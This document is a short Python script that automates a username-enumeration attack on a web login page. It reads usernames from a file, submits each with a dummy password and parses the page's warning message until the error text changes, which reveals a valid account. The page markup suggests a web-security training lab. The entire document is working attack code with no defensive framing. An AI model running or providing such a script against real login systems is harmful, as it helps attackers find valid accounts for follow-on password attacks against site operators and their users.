import requests
import sys
from bs4 import BeautifulSoup


def main():
    # Ensure that the proper arguments are provided
    if len(sys.argv) != 2:
        print("Please include the URL to the login page")
        return
    # Retrieve URL from the command-line arguments
    url = sys.argv[1]
    session = requests.session()
    # Open usernames file for reading
    usernames = open('usernames.txt', 'r')
    # Iterate through usernames
    for username in usernames:
        # Remove newline from username
        username = username.split()[0]
        # Send login request with username
        response = session.post(url, data={'username':username, 'password':'a'})
        # Parse response to get the error message
        soup = BeautifulSoup(response.text, 'html.parser')
        error_message = soup.find("p", {"class": "is-warning"}).get_text()
        # Print error message
        print(f"{username}  ->  {error_message}")
        # Check for anomalous error message
        if error_message != "Invalid username":
            print("--- RECEIVED DIFFERENT ERROR MESSAGE ---")
            break


if __name__ == "__main__":
    main()